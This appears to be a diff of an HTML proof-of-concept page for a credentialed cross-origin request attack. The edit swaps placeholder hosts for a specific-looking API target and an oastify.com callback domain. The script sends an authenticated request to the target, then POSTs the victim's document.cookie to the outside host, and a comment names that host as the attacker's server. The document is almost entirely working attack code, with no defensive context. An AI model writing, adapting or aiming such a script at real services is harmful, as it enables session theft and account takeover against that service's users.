@@ -2,13 +2,13 @@
 <body>
    <script>
       var xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://vulnerable-website.com/sensitive-endpoint', true);
+      xhr.open('GET', 'https://api.simplepay.ai', true);
       xhr.withCredentials = true;  // Ensures cookies are sent
       xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
             // Send the data back to the attacker's server
             var cookies = document.cookie;
-            fetch('http://attacker-server.com/steal-data', {
+            fetch('http://l5r77471hpr6ozq8ou9zfhk0crii6hu6.oastify.com', {
                method: 'POST',
                body: cookies
             });
